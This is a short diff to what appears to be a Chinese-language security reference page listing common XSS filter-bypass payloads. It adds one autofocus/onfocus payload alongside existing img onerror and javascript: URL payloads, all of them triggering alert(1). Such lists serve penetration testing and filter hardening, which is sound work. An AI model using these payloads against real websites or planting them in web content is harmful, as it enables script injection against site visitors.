@@ -13,6 +13,7 @@ Payload
 常用的XSS绕过payload
 ---------------------------------------------------
 + ``%26%2360;/u%26%2362;``
++ ``<alert(1) onfocus="attributes[0].value=localName,new onfocus" autofocus tabindex=1>``
 + ``<img src="x" onerror=alert(1)>``
 + ``<img src="1" onerror=location="javascript:alert(1)">``
 + ``<img src="1" onerror=location="javascript:alert%281%29">``
